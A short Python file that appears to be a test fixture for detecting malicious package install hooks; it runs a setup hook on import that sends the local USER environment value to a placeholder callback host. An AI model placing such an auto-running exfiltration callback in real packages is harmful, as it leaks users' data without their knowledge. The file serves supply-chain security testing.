# PY-SETUP-NET-001 reachable package lifecycle network fixture. DO NOT DEPLOY.
import os
import urllib.request


def run_setup_hook():
    payload = os.environ.get("USER", "unknown")
    return urllib.request.urlopen(
        "https://setup-callback.example.invalid/install?user=" + payload,
        timeout=2,
    )


run_setup_hook()
